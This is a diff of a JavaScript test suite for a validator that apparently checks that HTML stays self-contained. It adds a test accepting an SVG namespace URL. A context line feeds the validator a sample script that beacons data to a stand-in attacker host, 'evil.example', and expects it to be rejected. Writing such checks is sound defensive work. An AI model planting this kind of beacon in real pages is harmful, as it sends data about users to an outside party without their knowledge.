@@ -215,6 +215,14 @@ describe("checkSelfContained", () => {
     ).toEqual([]);
   });
 
+  it("passes the namespace an SVG written as a file has to name", () => {
+    expect(
+      errorsFor(
+        `<script>const svg = \`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 800">\`;</script>`,
+      ),
+    ).toEqual([]);
+  });
+
   it("rejects any other address a script builds at runtime", () => {
     expect(
       errorsFor(`<script>fetch("https://evil.example/beacon?p=1");</script>`),
